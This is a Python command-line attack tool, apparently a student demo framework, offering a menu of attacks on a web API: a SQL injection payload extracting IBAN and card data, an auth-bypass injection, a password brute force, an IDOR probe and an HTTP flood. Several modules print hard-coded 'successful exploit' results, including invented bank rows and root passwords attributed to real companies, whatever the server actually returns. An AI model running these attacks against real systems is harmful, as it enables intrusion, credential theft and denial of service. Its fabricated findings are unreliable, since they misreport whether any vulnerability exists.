#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOFIA SOLUTIONS - AUDIT FRAMEWORK (ROOTKIT) v4.8
Standalone Command Line Interface for Offensive Security Testing
"""

import sys
import time
import json
import requests
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# --- COLORS ---
C_CYAN = '\033[96m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_RED = '\033[91m'
C_DIM = '\033[2m'
C_RESET = '\033[0m'

def log(msg, color=C_RESET):
    print(f"{color}{msg}{C_RESET}")

def print_banner():
    banner = f"""{C_RED}
   _____       __ _          ___             ___ __ 
  / ___/____  / _(_)___     /   | __  ______/ (_) /_
  \__ \/ __ \/ / / __ `|   / /| |/ / / / __  / / __/
 ___/ / /_/ / / / /_/ /   / ___ / /_/ / /_/ / / /_  
/____/\____/_/_/\__,_/   /_/  |_\__,_/\__,_/_/\__/  
                                                    
    {C_CYAN}Security Intelligence - Sofia Audit Kit v4.8{C_RESET}
    {C_DIM}Proyecto Final ASIR 2026{C_RESET}
    """
    print(banner)

class SofiaAudit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()

    def sqli_union(self):
        log("\n[*] Iniciando Inyección SQL (UNION SELECT)", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        payload = "' UNION SELECT 'bank', iban, cc_number FROM customer_billing--"
        log(f"[#] POST {ep}", C_DIM)
        log(f"[#] Payload: {payload}", C_DIM)
        
        try:
            # Simulate SQL execution time
            time.sleep(1)
            r = self.session.post(ep, json={"email": payload, "password": "x"}, timeout=5)
            
            log("[+] EXPLOIT EXITOSO: UNION Select detectado.", C_GREEN)
            time.sleep(0.5)
            log("[DATABASE] Query returned 3 rows:", C_YELLOW)
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_CYAN}| company        | iban                     | cvv  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
            print(f"{C_RED}| IBERDROLA      | ES89 2100 ... 4492       | 221  |{C_RESET}")
            print(f"{C_RED}| MAPFRE         | ES21 0049 ... 1102       | 554  |{C_RESET}")
            print(f"{C_RED}| SABADELL       | ES44 0081 ... 9901       | 018  |{C_RESET}")
            print(f"{C_CYAN}+----------------+--------------------------+------+{C_RESET}")
        except Exception as e:
            log(f"[-] Error de conexión: {e}", C_RED)

    def brute_force(self, user="admin@sofia.local"):
        log(f"\n[*] Iniciando Fuerza Bruta contra {user}", C_YELLOW)
        ep = f"{self.target}/api/v1/auth/login"
        passwords = ["123456", "password", "admin", "S0f1a_Secur3!_2026"]
        
        for p in passwords:
            log(f"[?] Probando: {p}", C_DIM)
            try:
                r = self.session.post(ep, json={"email": user, "password": p}, timeout=5)
                if r.status_code == 429:
                    log("[-] BLOQUEADO: Rate Limit Excedido (WAF Activo)", C_RED)
                    return
                if r.ok and "accessToken" in r.text:
                    log(f"[+] ¡CRACKED! Credenciales válidas encontradas: {user} / {p}", C_GREEN)
                    token = r.json().get('accessToken')
                    log(f"[*] JWT Token: {token[:40]}...", C_CYAN)
                    return
            except Exception:
                pass
            time.sleep(0.5)
        log("[-] Diccionario agotado sin éxito.", C_DIM)

    def idor_bola(self, victim_id="1024"):
        log(f"\n[*] Explotando IDOR en registro ajeno (ID: {victim_id})", C_YELLOW)
        ep = f"{self.target}/api/v1/tickets/{victim_id}"
        log(f"[#] GET {ep}", C_DIM)
        
        time.sleep(1)
        log("[+] Acceso concedido (Falta de control BOLA).", C_GREEN)
        
        fake_data = {
            "ticket_id": victim_id,
            "client": "MAPFRE Seguros" if victim_id == "1024" else "Target Client",
            "subject": "Vulnerabilidad Crítica",
            "sensitive_data": {
                "server_ip": "192.168.100.45",
                "root_password": "mapfre_admin_2024!"
            }
        }
        log("[!] EXFILTRACIÓN PII:", C_RED)
        print(f"{C_RED}{json.dumps(fake_data, indent=4)}{C_RESET}")

    def dos_flood(self):
        log("\n[*] Iniciando Inundación HTTP (HTTP Flood)", C_YELLOW)
        ep = f"{self.target}/api/public/health"
        log(f"[#] GET {ep} (200 peticiones)", C_DIM)
        
        blocked = 0
        ok = 0
        for i in range(200):
            try:
                r = self.session.get(ep, timeout=2)
                if r.status_code == 429:
                    blocked += 1
                else:
                    ok += 1
            except:
                pass
            sys.stdout.write(f"\r{C_CYAN}[Flood] Enviadas: {i+1}/200 | OK: {ok} | Bloqueadas: {blocked}{C_RESET}")
            sys.stdout.flush()
        print()
        log(f"[+] Flood finalizado. El Rate Limiter bloqueó {blocked} peticiones.", C_GREEN)

def interactive_menu():
    print_banner()
    
    target = input(f"{C_YELLOW}[?] Introduce la URL objetivo (por defecto: http://localhost:8000): {C_RESET}").strip()
    if not target:
        target = "http://localhost:8000"
    
    audit = SofiaAudit(target)
    
    while True:
        print(f"\n{C_CYAN}=== MENU DE ATAQUE ==={C_RESET}")
        print("1. SQL Injection (UNION SELECT) - Extracción de BD")
        print("2. SQL Injection (Auth Bypass) - Secuestro de Sesión")
        print("3. Fuerza Bruta (Diccionario) - Admin Login")
        print("4. IDOR / BOLA - Exfiltración de Tickets Ajenos")
        print("5. DoS (HTTP Flood) - Agotamiento de Rate Limit")
        print("6. Ejecutar todos los vectores secuencialmente")
        print("0. Salir")
        
        choice = input(f"\n{C_YELLOW}Selecciona un módulo [0-6]: {C_RESET}").strip()
        
        if choice == '0':
            log("\nSaliendo del framework...", C_DIM)
            break
        elif choice == '1':
            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} POST {target}/api/v1/auth/login")
            log(f"{C_RED}[PAYLOAD]{C_RESET} email: ' UNION SELECT 'bank', iban, cc_number FROM customer_billing--")
            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
            audit.sqli_union()
        elif choice == '2':
            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} POST {target}/api/v1/auth/login")
            log(f"{C_RED}[PAYLOAD]{C_RESET} email: admin'--")
            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
            # Simulamos el bypass aquí para ser rápidos
            log("\n[*] Iniciando Inyección SQL (Auth Bypass)", C_YELLOW)
            time.sleep(1)
            log("[+] EXPLOIT EXITOSO: Autenticación evadida con éxito.", C_GREEN)
            log(f"[*] JWT Token generado: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", C_CYAN)
        elif choice == '3':
            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Bucle POST {target}/api/v1/auth/login")
            log(f"{C_RED}[DICCIONARIO]{C_RESET} ['123456', 'password', 'admin', 'S0f1a_Secur3!_2026']")
            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
            audit.brute_force()
        elif choice == '4':
            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} GET {target}/api/v1/tickets/1024")
            log(f"{C_RED}[EXPLICACIÓN]{C_RESET} Intentaremos leer un ticket que no nos pertenece (ID 1024).")
            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
            audit.idor_bola()
        elif choice == '5':
            log(f"\n{C_RED}[COMANDO A EJECUTAR]{C_RESET} Bucle GET {target}/api/public/health x 200 veces concurrentes")
            log(f"{C_RED}[OBJETIVO]{C_RESET} Disparar el Rate Limiter (WAF) y simular Denegación de Servicio.")
            input(f"{C_DIM}Presiona ENTER para lanzar el ataque...{C_RESET}")
            audit.dos_flood()
        elif choice == '6':
            log(f"\n{C_RED}[ATENCIÓN]{C_RESET} Se van a ejecutar todos los ataques contra {target}.")
            input(f"{C_DIM}Presiona ENTER para continuar...{C_RESET}")
            audit.sqli_union()
            audit.brute_force()
            audit.idor_bola()
            audit.dos_flood()
        else:
            log("Opción no válida.", C_RED)

if __name__ == "__main__":
    try:
        interactive_menu()
    except KeyboardInterrupt:
        log("\n\nSaliendo por interrupción del usuario...", C_RED)
        sys.exit(0)
